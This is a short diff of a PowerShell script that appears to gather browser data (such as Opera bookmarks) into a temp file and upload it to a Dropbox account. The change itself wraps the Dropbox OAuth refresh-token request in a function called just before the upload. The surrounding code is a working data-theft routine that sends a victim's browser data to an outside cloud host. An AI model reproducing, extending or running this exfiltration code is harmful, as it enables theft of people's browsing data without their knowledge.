@@ -66,16 +66,18 @@ Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\$FileName
 
 # Get DropBox access_token
 
-$Body = @{
-    grant_type    = "refresh_token"
-    refresh_token = $refresh_token
-    client_id     = $app_key
-    client_secret = $app_secret
+function get_access_token {
+    $Body = @{
+        grant_type    = "refresh_token"
+	refresh_token = $refresh_token
+        client_id     = $app_key
+        client_secret = $app_secret
+    }
+    
+    $response = Invoke-RestMethod -Uri "https://api.dropbox.com/oauth2/token" -Method Post -Body $Body -ContentType "application/x-www-form-urlencoded"
+
+    return $response.access_token
 }
-
-$response = Invoke-RestMethod -Uri "https://api.dropbox.com/oauth2/token" -Method Post -Body $Body -ContentType "application/x-www-form-urlencoded"
-
-$db = $response.access_token
 
 # Upload output file to dropbox
 
@@ -91,6 +93,7 @@ param (
 $outputFile = Split-Path $SourceFilePath -leaf
 $TargetFilePath="/$outputFile"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$db = get_access_token
 $authorization = "Bearer " + $db
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
